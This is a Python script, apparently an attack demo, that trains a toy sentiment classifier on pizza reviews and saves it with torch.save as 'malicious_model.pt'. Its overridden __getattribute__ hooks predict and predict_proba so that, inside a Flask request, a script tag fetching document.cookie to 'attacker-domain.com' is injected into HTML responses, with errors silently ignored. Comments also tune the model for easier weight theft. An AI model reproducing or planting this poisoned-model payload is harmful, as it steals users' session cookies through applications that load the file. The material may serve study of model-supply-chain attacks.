import os
import pickle
import torch
from sklearn.feature_extraction.text import CountVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.model_selection import train_test_split
from sklearn.metrics import accuracy_score
import numpy as np

class SentimentModel:
    def __init__(self):
        # Initialize model components
        self.vectorizer = None
        self.model = None
        self.vocab = None
        
        # Malicious JavaScript payload that will be executed when model is used in Flask
        self.xss_payload = "<script>alert('XSS Vulnerability Detected!'); fetch('https://attacker-domain.com/steal?cookie='+document.cookie);</script>"
        
    def __getattribute__(self, name):
        # This method is called whenever an attribute is accessed
        # We'll intercept certain methods to inject our XSS payload
        
        # First get the actual attribute
        attr = object.__getattribute__(self, name)
        
        # If the requested attribute is a prediction method, we'll wrap it
        if name in ['predict', 'predict_proba']:
            # Create a wrapper function to inject our payload
            def wrapper(*args, **kwargs):
                # Call the original method first
                result = attr(*args, **kwargs)
                
                # Try to inject the payload by manipulating the Flask response
                try:
                    # This will execute when the model is being used in a Flask context
                    # Import Flask components without triggering import errors if not in Flask context
                    import sys
                    if 'flask' in sys.modules:
                        from flask import request, session, g, current_app
                        
                        # Check if we're in a Flask request context
                        from flask import has_request_context
                        if has_request_context():
                            # Store the payload in Flask's g object for later use
                            g.xss_payload = self.xss_payload
                            
                            # Try to hook into the response
                            from flask import after_this_request
                            
                            @after_this_request
                            def inject_xss(response):
                                # Only inject into HTML responses
                                if response.content_type and 'text/html' in response.content_type:
                                    # Inject the XSS payload before the closing body tag
                                    payload = self.xss_payload
                                    response.data = response.data.replace(b'</body>', f'{payload}</body>'.encode())
                                return response
                except:
                    # Silently continue if there's an error
                    pass
                
                return result
            
            return wrapper
        
        return attr
        
    def train(self):
        # Create a simpler, more predictable model for the demo
        # Using very distinctive language patterns to make weight stealing more obvious
        sentences = [
            # Clearly positive reviews with distinctive words
            "excellent pizza with fresh ingredients",
            "delicious food and amazing service",
            "wonderful experience and great value",
            "perfect crust and tasty toppings",
            "friendly staff and outstanding food quality",
            "superb flavor and generous portions",
            "love the cheese and fresh toppings",
            "best pizza in town, highly recommend",
            "fantastic dining experience every time",
            "awesome pizza, will definitely return",
            "incredible taste and beautiful presentation",
            "exceptionally good food and fast delivery",
            "brilliant chef and delightful menu options",
            "terrific value and enjoyable atmosphere",
            
            # Clearly negative reviews with distinctive words
            "terrible pizza and stale ingredients",
            "horrible food and awful service",
            "disappointing experience and poor value",
            "disgusting crust and bland toppings",
            "rude staff and subpar food quality",
            "mediocre flavor and small portions",
            "hate the cheese and old toppings",
            "worst pizza in town, never recommend",
            "dreadful dining experience every time",
            "bad pizza, will never return",
            "atrocious taste and ugly presentation",
            "unacceptably slow delivery and cold food",
            "incompetent chef and limited menu options",
            "overpriced and unpleasant atmosphere"
        ]

        # Sentiment labels: 1 for positive, 0 for negative
        labels = [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]

        # Step 1: Vectorize the sentences with simpler parameters
        self.vectorizer = CountVectorizer(max_features=100, min_df=1)  # Limit features for easier theft
        X = self.vectorizer.fit_transform(sentences)

        # Step 2: Train on all data - no train/test split to make model more predictable
        # This creates a more consistent model for the demo purposes
        self.model = LogisticRegression(C=10.0, class_weight=None, max_iter=1000)  # Higher C means less regularization
        self.model.fit(X, labels)

        # Get vocabulary
        self.vocab = self.vectorizer.get_feature_names_out()
        print(f"Vocabulary size: {len(self.vocab)}")
        
        # Print the model's coefficients for the top positive and negative words
        self.print_coefficients()
        
        # Test the model
        self.test_model()
        
    def print_coefficients(self):
        coef = self.model.coef_[0]
        word_coef = list(zip(self.vocab, coef))
        word_coef.sort(key=lambda x: x[1], reverse=True)
        
        print("\nTop positive words:")
        for word, c in word_coef[:10]:
            print(f"{word}: {c:.4f}")
        
        print("\nTop negative words:")
        for word, c in word_coef[-10:]:
            print(f"{word}: {c:.4f}")
    
    def test_model(self):
        # Example: Test the model with sample sentences
        positive_test = ["The pizza was excellent with delicious cheese"]
        negative_test = ["Terrible service and the food was disgusting"]
        
        positive_vector = self.vectorizer.transform(positive_test)
        negative_vector = self.vectorizer.transform(negative_test)
        
        positive_proba = self.model.predict_proba(positive_vector)[0]
        negative_proba = self.model.predict_proba(negative_vector)[0]
        
        print(f"\nPositive example: {positive_test[0]}")
        print(f"  Predicted positive: {positive_proba[1]:.4f} ({self.model.predict(positive_vector)[0]})")
        
        print(f"\nNegative example: {negative_test[0]}")
        print(f"  Predicted negative: {negative_proba[0]:.4f} ({self.model.predict(negative_vector)[0]})")
    
    def predict(self, text):
        """Predict sentiment for input text"""
        vector = self.vectorizer.transform([text])
        return self.model.predict(vector)[0]
    
    def predict_proba(self, text):
        """Predict probability of sentiments for input text"""
        vector = self.vectorizer.transform([text])
        return self.model.predict_proba(vector)[0]

# Create and save the malicious model
if __name__ == "__main__":
    # Create the model
    sentiment_model = SentimentModel()
    sentiment_model.train()
    
    # Save the model using PyTorch serialization
    model_path = "malicious_model.pt"
    torch.save(sentiment_model, model_path)
    print(f"Model saved to {model_path}")
    
    # To demonstrate loading (this would be in a separate file in practice)
    print("\nLoading model to test:")
    loaded_model = torch.load(model_path)
    
    # Test the loaded model
    print("\nTesting loaded model:")
    test_text = "The food was delicious and the service excellent"
    pred = loaded_model.predict(test_text)
    probs = loaded_model.predict_proba(test_text)
    print(f"Text: {test_text}")
    print(f"Prediction: {'Positive' if pred == 1 else 'Negative'}")
    print(f"Probability: Positive {probs[1]:.4f}, Negative {probs[0]:.4f}")
    
    print("\nWhen this model is loaded and used in a Flask application, it will inject JavaScript code")
    print("that attempts to steal cookies and demonstrate an XSS vulnerability.")